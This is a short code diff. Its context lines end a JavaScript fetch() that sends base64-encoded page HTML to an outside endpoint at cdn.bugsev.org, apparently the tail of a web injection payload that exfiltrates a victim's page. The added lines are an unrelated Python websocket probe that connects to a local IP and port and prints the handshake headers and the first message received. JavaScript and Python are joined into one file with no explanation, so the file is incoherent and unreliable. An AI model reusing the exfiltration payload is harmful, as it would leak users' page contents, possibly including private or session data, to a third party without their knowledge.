@@ -11,3 +11,37 @@ fetch('https://cdn.bugsev.org/endpoint', {
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({ html: base64 })
 });
+
+
+
+
+import websocket
+
+IP = "192.168.1.100"
+PORT = 8080
+PATH = "/"
+
+url = f"ws://{IP}:{PORT}{PATH}"
+
+try:
+    ws = websocket.create_connection(url)
+
+    print("[+] Connected successfully!")
+
+    # Print the HTTP handshake response
+    print(f"Status: {ws.status}")
+    print("\nHeaders:")
+    for header, value in ws.headers.items():
+        print(f"{header}: {value}")
+
+    # Optionally receive the first message (if the server sends one)
+    try:
+        msg = ws.recv()
+        print(f"\nReceived: {msg}")
+    except Exception:
+        print("\nNo initial message received.")
+
+    ws.close()
+
+except Exception as e:
+    print(f"[-] Connection failed: {e}")
